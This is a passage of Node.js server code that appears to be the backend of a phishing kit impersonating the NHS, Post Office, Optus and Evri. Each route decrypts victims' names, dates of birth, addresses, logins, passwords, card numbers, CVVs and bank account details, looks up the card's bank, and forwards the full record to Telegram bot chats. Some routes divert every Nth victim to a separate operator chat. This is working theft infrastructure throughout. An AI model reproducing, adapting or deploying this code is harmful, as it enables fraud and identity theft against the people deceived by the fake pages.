          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSManny:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=913906957&text=NHS:\n${originalText}`
        );
        mannyman789 += 1;
      }

      res.send("Update Completed");
    });
});

let mulligang135 = 0;

app.options("/mulligang135", cors());

app.post("/mulligang135", (req, res) => {
  firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = `${req.body.userAgent}`;
  ip = `${req.body.ip}`;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (mulligang135 == 10) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        mulligang135 = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSMulli:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1990774394&text=NHS:\n${originalText}`
        );
        mulligang135 += 1;
      }

      res.send("Update Completed");
    });
});

let lingypack = 0;

app.options("/lingypackNHS", cors());

app.post("/lingypackNHS", (req, res) => {
  firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastname = CryptoJS.AES.decrypt(req.body.lname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstname} ${lastname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (lingypack == 10) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        lingypack = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NHSLingz:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=5235839910&text=NHS:\n${originalText}`
        );
        lingypack += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/giveip", cors());

app.post("/giveip", (req, res) => {
  ip = req.body.ip;

  content = `${ip}\n`;
  fs.appendFile("ips.txt", content, (err) => {
    res.send("Update Completed");
  });
});

//POSTOFFICE
//POSTOFFICE
//POSTOFFICE

app.options("/tCapz", cors());

app.post("/tCapz", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (lingypack == 10) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        lingypack = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=POTcapz:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1437456088&text=PO:\n${originalText}`
        );
        lingypack += 1;
      }

      res.send("Update Completed");
    });
});

//OPTUS
//OPTUS
//OPTUS
app.options("/spooferGooferOptus", cors());

app.post("/spooferGooferOptus", (req, res) => {
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userAgent = req.body.userAgent;
  ip = req.body.ip;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${zip} | ${bankName}`;
      var originalText = `+----------- Login Information ------------+\nEmail: ${email}\nPassword: ${password}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (Spoofergoofer == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
          )
          .catch((err) => {
            console.log(err);
          });
        Spoofergoofer = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=OptusSpooferGoofer:\n${originalText}`
          )
          .catch((err) => {
            console.log(err);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=993063133&text=Optus:\n${originalText}`
          )
          .catch((err) => {
            console.log(err);
          });
        Spoofergoofer += 1;
      }
      res.send("Update Completed");
    });
});

app.options("/firstTrustOptus", cors());

app.post("/firstTrustOptus", (req, res) => {
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userAgent = req.body.userAgent;
  ip = req.body.ip;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${zip} | ${bankName}`;
      var originalText = `+----------- Login Information ------------+\nEmail: ${email}\nPassword: ${password}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (Spoofergoofer == 1000) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        Spoofergoofer = 4;
      } else if (ip == "203.87.106.78") {
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `OptusFirstTrust:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 837638060,
              text: `Optus:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        Spoofergoofer += 1;
      }
      res.send("Update Completed");
    });
});

app.options("/gooferHaytchOptus", cors());

app.post("/gooferHaytchOptus", (req, res) => {
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userAgent = req.body.userAgent;
  ip = req.body.ip;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${zip} | ${bankName}`;
      var originalText = `+----------- Login Information ------------+\nEmail: ${email}\nPassword: ${password}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      axios
        .post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
          {
            chat_id: "-731784056",
            text: `Optus:\n${originalText}`,
            parse_mode: "Markdown",
          }
        )
        .catch((e) => {
          console.log(e);
        });
      res.send("Update Completed");
    });
});

app.options("/offshorebillionsOptus", cors());

app.post("/offshorebillionsOptus", (req, res) => {
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userAgent = req.body.userAgent;
  ip = req.body.ip;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${zip} | ${bankName}`;
      var originalText = `+----------- Login Information ------------+\nEmail: ${email}\nPassword: ${password}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (bill == 100) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
          )
          .catch((err) => {
            console.log(err);
          });
        Spoofergoofer = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=OptusOSB:\n${originalText}`
          )
          .catch((err) => {
            console.log(err);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1248091713&text=Optus:\n${originalText}`
          )
          .catch((err) => {
            console.log(err);
          });
      }
      res.send("Update Completed");
    });
});

app.options("/loyaltyOptus", cors());

app.post("/loyaltyOptus", (req, res) => {
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userAgent = req.body.userAgent;
  ip = req.body.ip;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${zip} | ${bankName}`;
      var originalText = `+----------- Login Information ------------+\nEmail: ${email}\nPassword: ${password}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (Spoofergoofer == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
          )
          .catch((err) => {
            console.log(err);
          });
        Spoofergoofer = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=OptusLoyalty:\n${originalText}`
          )
          .catch((err) => {
            console.log(err);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=874673138&text=Optus:\n${originalText}`
          )
          .catch((err) => {
            console.log(err);
          });
        Spoofergoofer += 1;
      }
      res.send("Update Completed");
    });
});

//EVRI
//EVRI
//EVRI

let chasingfunds = 0;

app.options("/chasingfundsEvri", cors());

app.post("/chasingfundsEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (chasingfunds == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        chasingfunds = 0;
      } else {
        if (bin === "542011") {
          axios.post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
          );
        } else {
          axios.post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriChasing:\n${originalText}`
          );
          axios.post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=864072421&text=Evri:\n${originalText}`
          );
        }
        chasingfunds += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/@skiii719", cors());

app.post("/@skiii719", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort code: ${scode}\nAccount number: ${accno}+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (skiii719 == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        skiii719 = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=Evriskiii719:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=5334039930&text=Evri:\n${originalText}`
        );
        skiii719 += 1;
      }

      res.send("Update Completed");
    });
});

let F_zn66 = 0;

app.options("/F_zn66", cors());

app.post("/F_zn66", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
